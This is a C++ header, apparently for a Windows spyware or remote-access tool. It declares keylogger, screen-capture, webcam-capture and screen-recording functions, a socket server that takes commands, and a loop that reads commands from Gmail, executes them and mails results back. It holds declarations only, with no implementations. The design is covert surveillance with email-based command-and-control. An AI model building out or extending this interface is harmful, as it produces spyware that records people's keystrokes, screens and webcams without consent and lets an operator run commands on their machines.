#pragma once
#define WIN32_LEAN_AND_MEAN
#define _CRT_SECURE_NO_WARNINGS
#include <algorithm>
#include <atomic>
#include <cstdint>
#include <cwchar>
#include <fstream>
#include <iostream>
#include <mutex>
#include <sstream>
#include <string>
#include <string.h>
#include <thread>
#include <Windows.h>
#include <TlHelp32.h>
#include <WinSock2.h>
#include <WS2tcpip.h>
#include <chrono>
#include <cstdlib>
#include <opencv2/opencv.hpp>
#include <tchar.h>
#include <psapi.h>
#include <vector>
#include <set> 
#include <filesystem>

#pragma comment(lib, "ws2_32.lib")

// Keylogger functions
void startKeylogger();
void stopKeylogger();

// List processes
std::string listProcesses();
bool startProcess(const std::string& path);
bool stopProcess(const std::string& exeName);

// System functions
bool restartSystem();
bool shutdownSystem();

// Screen capture functions
bool captureScreen(const std::string& filename);
bool captureWebcamPhoto(const std::string& filename);
std::string captureWebcamFrames(int duration);

bool fileExists(const std::string& filename);
void startSocketServer();
void handleCommand(SOCKET sock, const std::string& cmd);

// Record screen
void startScreenRecording(const std::string& filename);
void stopScreenRecording();
bool isRecording();

// List user applications
std::string listUserApps();

// Mail API functions
bool sendEmail(const std::string& subject, const std::string& body);
std::string readLastEmailCommand();
bool refreshAccessToken();
bool isValidCommand(const std::string& cmd);
std::string executeCommand(const std::string& cmd);
void startGmailControlLoop();